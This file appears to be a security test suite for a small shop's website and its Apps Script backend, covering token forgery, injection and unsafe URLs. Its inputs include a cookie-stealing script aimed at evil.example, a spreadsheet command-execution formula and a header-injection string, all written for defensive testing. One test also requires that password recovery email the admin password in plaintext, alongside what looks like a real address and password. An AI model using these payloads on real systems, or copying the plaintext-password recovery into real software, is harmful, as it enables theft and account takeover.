/**
 * =====================================================================
 *  Blooms & Flame Wax — Automated Security & Injection Verification
 *  Run with: node tests/verify-security.js
 * =====================================================================
 */
"use strict";

const assert = require("assert");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const vm = require("vm");

const SEC = require("../js/security.js");
const DATA = require("../js/products-data.js");

/* ---------- Build a sandboxed Apps Script runtime mock ---------- */
function createAppsScriptSandbox() {
  const store = {
    props: {
      ADMIN_EMAIL: "studio@example.com",
      ADMIN_PASSWORD: "SuperSecretPassword!2026"
    },
    cache: {},
    sheets: {},
    sentEmails: []
  };

  function makeSheet(name) {
    const rows = [];
    return {
      name,
      rows,
      getLastRow: () => rows.length,
      appendRow: (r) => rows.push(r.slice()),
      deleteRow: (idx1) => rows.splice(idx1 - 1, 1),
      setFrozenRows: () => {},
      getRange: (r, c, numRows = 1, numCols = 1) => ({
        setValues: (vals) => {
          for (let i = 0; i < numRows; i++) {
            if (!rows[r - 1 + i]) rows[r - 1 + i] = [];
            for (let j = 0; j < numCols; j++) rows[r - 1 + i][c - 1 + j] = vals[i][j];
          }
          return { setFontWeight: () => {} };
        },
        setValue: (val) => {
          if (!rows[r - 1]) rows[r - 1] = [];
          rows[r - 1][c - 1] = val;
        },
        getValues: () => {
          const out = [];
          for (let i = 0; i < numRows; i++) {
            const src = rows[r - 1 + i] || [];
            out.push(src.slice(c - 1, c - 1 + numCols));
          }
          return out;
        }
      })
    };
  }

  const sandbox = {
    console,
    Date,
    Math,
    JSON,
    Array,
    Object,
    String,
    Number,
    Boolean,
    RegExp,
    Error,
    isFinite,
    parseInt,
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in store.props ? store.props[k] : null),
        setProperty: (k, v) => { store.props[k] = String(v); },
        setProperties: (obj) => { Object.keys(obj).forEach((k) => { store.props[k] = String(obj[k]); }); },
        deleteProperty: (k) => { delete store.props[k]; }
      })
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (k in store.cache ? store.cache[k] : null),
        put: (k, v) => { store.cache[k] = String(v); },
        remove: (k) => { delete store.cache[k]; }
      })
    },
    LockService: {
      getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} })
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => store.sheets[n] || null,
        insertSheet: (n) => { store.sheets[n] = makeSheet(n); return store.sheets[n]; }
      })
    },
    MailApp: {
      sendEmail: (msg) => { store.sentEmails.push(msg); }
    },
    Session: {
      getScriptTimeZone: () => "Asia/Kolkata"
    },
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput: (txt) => ({
        _text: txt,
        setMimeType: function () { return this; },
        getContent: function () { return this._text; }
      })
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: "sha256" },
      getUuid: () => crypto.randomUUID(),
      sleep: () => {},
      formatDate: (d) => new Date(d).toISOString(),
      newBlob: (input) => ({
        getBytes: () => Buffer.isBuffer(input) ? input : Buffer.from(String(input), "utf8"),
        getDataAsString: () => Buffer.isBuffer(input) ? input.toString("utf8") : String(input)
      }),
      base64Encode: (bytes) => Buffer.from(bytes).toString("base64"),
      base64EncodeWebSafe: (bytes) => Buffer.from(bytes).toString("base64").replace(/\+/g, "-").replace(/\//g, "_"),
      base64DecodeWebSafe: (str) => Buffer.from(str.replace(/-/g, "+").replace(/_/g, "/"), "base64"),
      computeHmacSha256Signature: (value, key) =>
        crypto.createHmac("sha256", Buffer.from(String(key), "utf8")).update(Buffer.from(String(value), "utf8")).digest(),
      computeDigest: (_alg, value) =>
        Array.from(crypto.createHash("sha256").update(Buffer.from(String(value), "utf8")).digest())
    }
  };

  const codePath = path.join(__dirname, "..", "google-apps-script", "Code.gs");
  const code = fs.readFileSync(codePath, "utf8");
  vm.createContext(sandbox);
  vm.runInContext(code, sandbox, { filename: "Code.gs" });
  return { sandbox, store };
}

function post(sandbox, obj) {
  const res = sandbox.doPost({ postData: { contents: JSON.stringify(obj) } });
  return JSON.parse(res.getContent());
}

/* ============================ RUN TESTS ============================ */
const results = [];
function test(name, fn) {
  try {
    fn();
    results.push({ name, ok: true });
    console.log("  ✔ PASS:", name);
  } catch (err) {
    results.push({ name, ok: false, err });
    console.error("  ✘ FAIL:", name, "\n   ", err.message);
  }
}

console.log("\n=== Blooms & Flame Wax — Security & Injection Test Suite ===\n");
const { sandbox, store } = createAppsScriptSandbox();

test("1. setup() hashes ADMIN_PASSWORD, deletes plaintext, and creates JWT_SECRET", () => {
  sandbox.setup();
  assert.strictEqual(store.props.ADMIN_PASSWORD, undefined, "Plain ADMIN_PASSWORD must be deleted");
  assert.ok(store.props.ADMIN_PASSWORD_HASH && store.props.ADMIN_PASSWORD_HASH.length > 20);
  assert.ok(store.props.ADMIN_PASSWORD_SALT && store.props.ADMIN_PASSWORD_SALT.length >= 32);
  assert.ok(store.props.JWT_SECRET && store.props.JWT_SECRET.length >= 64);
});

let adminToken = "";
test("2. JWS (HS256) login issues RFC 7515 compact token & rejects wrong password", () => {
  const bad = post(sandbox, { action: "login", password: "wrong-password" });
  assert.strictEqual(bad.ok, false);
  assert.strictEqual(bad.code, "AUTH");

  const good = post(sandbox, { action: "login", password: "SuperSecretPassword!2026" });
  assert.strictEqual(good.ok, true);
  assert.strictEqual(typeof good.token, "string");
  assert.strictEqual(good.token.split(".").length, 3);
  adminToken = good.token;
});

test("3. JWS signature verification blocks payload tampering & alg:none attack", () => {
  const parts = adminToken.split(".");
  // Tamper payload
  const tamperedPayload = Buffer.from(JSON.stringify({ iss: "bfw-apps-script", aud: "bfw-admin", role: "admin", exp: 9999999999, ver: 1 }))
    .toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  const tamperedToken = parts[0] + "." + tamperedPayload + "." + parts[2];
  assert.strictEqual(sandbox.verifyJwt_(tamperedToken), null, "Tampered payload must fail HMAC verification");

  // alg: "none" attack
  const noneHeader = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" }))
    .toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  const noneToken = noneHeader + "." + parts[1] + "." + parts[2];
  assert.strictEqual(sandbox.verifyJwt_(noneToken), null, "alg:none token must be rejected");

  // Expired token
  const expiredToken = sandbox.signJwt_({
    iss: "bfw-apps-script", aud: "bfw-admin", sub: "admin", role: "admin",
    iat: 1000, nbf: 1000, exp: 1001, ver: 1
  });
  assert.strictEqual(sandbox.verifyJwt_(expiredToken), null, "Expired JWS must be rejected");
});

test("4. Protected admin endpoints reject unauthenticated requests", () => {
  const res = post(sandbox, { action: "listSubmissions", token: "invalid.jwt.token" });
  assert.strictEqual(res.ok, false);
  assert.strictEqual(res.code, "AUTH");
});

test("5. Contact form stores submission, neutralises formula injection, and sends Admin + Auto-Reply emails", () => {
  const res = post(sandbox, {
    action: "contact",
    name: "Aarav Sharma",
    email: "aarav@example.com",
    phone: "+91 98765 43210",
    product: "Aqua Rose Bloom",
    message: "=cmd|' /C calc'!A0  Hello studio, I would like 25 candles for Deepavali.",
    website: "",
    elapsedMs: 6400,
    page: "contact"
  });
  assert.strictEqual(res.ok, true, "Valid contact form must succeed");
  const rows = store.sheets.contextdetails.rows;
  assert.strictEqual(rows.length, 2, "Must append 1 row after header");
  const savedMsg = rows[1][5];
  assert.ok(savedMsg.startsWith("'=cmd"), "Formula payload in message must be prefixed with a leading apostrophe");
  assert.strictEqual(store.sentEmails.length, 2, "Both admin notification and visitor auto-reply emails must be sent");
  assert.ok(!store.sentEmails[1].body.includes("=cmd"), "Auto-reply must not echo untrusted visitor message body");
});

test("6. XSS / HTML tag injection in contact message is blocked at validation", () => {
  const res = post(sandbox, {
    action: "contact",
    name: "Mallory",
    email: "mallory@example.com",
    phone: "+91 98765 43210",
    message: "Hello <script>fetch('https://evil.example/steal?c='+document.cookie)</script> world",
    website: "",
    elapsedMs: 5000
  });
  assert.strictEqual(res.ok, false, "Message containing <script> tag must be rejected");
  assert.strictEqual(res.code, "VALIDATION");
});

test("7. Contact form works WITHOUT email (email optional) and bot honeypot traps spam", () => {
  const beforeMails = store.sentEmails.length;
  const noEmailRes = post(sandbox, {
    action: "contact",
    name: "Karthik Raja",
    email: "",
    phone: "+91 98765 43210",
    product: "Festive Diya Gift Box",
    message: "Need 10 boxes for festival gifting",
    website: ""
  });
  assert.strictEqual(noEmailRes.ok, true, "Submission without email must succeed");
  assert.strictEqual(store.sentEmails.length, beforeMails + 1, "Admin Gmail notification must be sent even when visitor email is empty");

  // Also test no-cors URLSearchParams body format (application/x-www-form-urlencoded)
  const formBody = "action=contact&clientReqId=req_123&name=Priya+Raman&phone=%2B919876543210&email=&product=Tulip+Bouquet&message=Need+20+pieces&website=";
  const urlEncRes = JSON.parse(sandbox.doPost({ postData: { contents: formBody } }).getContent());
  assert.strictEqual(urlEncRes.ok, true, "URL-encoded no-cors fallback POST must succeed");
  const dupRes = JSON.parse(sandbox.doPost({ postData: { contents: formBody } }).getContent());
  assert.strictEqual(dupRes.ok, true);
  assert.strictEqual(dupRes.deduplicated, true, "Duplicate clientReqId retry must be deduplicated");

  // Also test Task 3: split Operation 2 (action=forgotPassword) from admin.html
  const beforeForgotMails = store.sentEmails.length;
  const forgotBody = "action=forgotPassword&clientReqId=forgot_01&adminId=srooban1211%40gmail.com&adminPassword=BloomsAdmin2026%21&requestedBy=srooban1211%40gmail.com";
  const forgotRes = JSON.parse(sandbox.doPost({ postData: { contents: forgotBody } }).getContent());
  assert.strictEqual(forgotRes.ok, true, "Forgot Password auto-email operation must succeed");
  assert.strictEqual(store.sentEmails.length, beforeForgotMails + 1, "Forgot Password must send recovery email to Admin Gmail");
  assert.ok(store.sentEmails[store.sentEmails.length - 1].body.includes("BloomsAdmin2026!"), "Recovery email must include the Admin password");

  const beforeRows = store.sheets.contextdetails.rows.length;
  // Honeypot filled
  const hp = post(sandbox, {
    action: "contact",
    name: "Spam Bot",
    email: "",
    phone: "+91 98765 43210",
    message: "Buy cheap crypto now!",
    website: "https://spambot.example"
  });
  assert.strictEqual(hp.ok, true, "Honeypot silently traps bot");
  assert.strictEqual(store.sheets.contextdetails.rows.length, beforeRows, "Honeypot submission must NOT be stored");
});

test("8. Email header CRLF injection & HTML escaping in Code.gs", () => {
  const hdr = sandbox.headerSafe_("Enquiry\r\nBcc: victim@example.com\r\nSubject: Pwned");
  assert.ok(!/[\r\n]/.test(hdr), "headerSafe_ must strip all CR/LF characters");

  const esc = sandbox.escapeHtml_(`"><img src=x onerror=alert(1)>`);
  assert.strictEqual(esc, "&quot;&gt;&lt;img src=x onerror=alert(1)&gt;");
});

test("9. Product CRUD blocks javascript:/data: image URLs & imports all 16 D:\\data products", () => {
  const badImg = post(sandbox, {
    action: "saveProduct",
    token: adminToken,
    product: {
      id: "xss-candle",
      name: "XSS Candle",
      category: "floral",
      description: "Test candle",
      image: "javascript:alert(1)"
    }
  });
  assert.strictEqual(badImg.ok, false, "javascript: image URL must be rejected");

  const imp = post(sandbox, {
    action: "importProducts",
    token: adminToken,
    products: DATA.products
  });
  assert.strictEqual(imp.ok, true);
  assert.strictEqual(imp.added, 16, "All 16 D:\\data studio products must import cleanly");
});

test("10. Frontend security.js blocks dangerous URLs, formula CSV cells & verifies no private leaks", () => {
  assert.strictEqual(SEC.safeUrl("javascript:alert(1)"), "#");
  assert.strictEqual(SEC.safeUrl("   JaVaScRiPt:alert(1)"), "#");
  assert.strictEqual(SEC.safeUrl("data:text/html,<script>alert(1)</script>"), "#");
  assert.strictEqual(SEC.safeImageSrc("../../etc/passwd"), SEC.PLACEHOLDER);
  assert.strictEqual(SEC.safeImageSrc("assets/images/products/aqua-rose.png"), "assets/images/products/aqua-rose.png");
  assert.strictEqual(SEC.csvCell("=HYPERLINK(\"http://evil\",\"click\")"), `"'=HYPERLINK(""http://evil"",""click"")"`);
});

test("11. Session revocation (logoutAll) invalidates previously issued JWS tokens", () => {
  const out = post(sandbox, { action: "logoutAll", token: adminToken });
  assert.strictEqual(out.ok, true);
  const after = post(sandbox, { action: "listSubmissions", token: adminToken });
  assert.strictEqual(after.ok, false, "Revoked token must no longer authenticate");
  assert.strictEqual(after.code, "AUTH");
});

test("12. All 5 HTML pages, scripts, stylesheets, background video, logo & 16 product images resolve cleanly", () => {
  const root = path.join(__dirname, "..");
  const pages = ["index.html", "shop.html", "about.html", "contact.html", "admin.html"];
  for (const p of pages) {
    const html = fs.readFileSync(path.join(root, p), "utf8");
    const refs = [...html.matchAll(/(?:src|href|data-src)="([^"]+)"/g)]
      .map((m) => m[1])
      .filter((u) => !u.startsWith("http") && !u.startsWith("#") && !u.startsWith("mailto:") && !u.startsWith("tel:"));
    for (const r of refs) {
      const clean = r.split("?")[0].split("#")[0];
      assert.ok(fs.existsSync(path.join(root, clean)), `${p} missing referenced asset: ${clean}`);
    }
  }
  for (const pr of DATA.products) {
    assert.ok(fs.existsSync(path.join(root, pr.image)), `Missing product image: ${pr.image}`);
  }
});

const failed = results.filter((r) => !r.ok);
console.log(`\nSummary: ${results.length - failed.length}/${results.length} checks passed.\n`);
if (failed.length) process.exit(1);
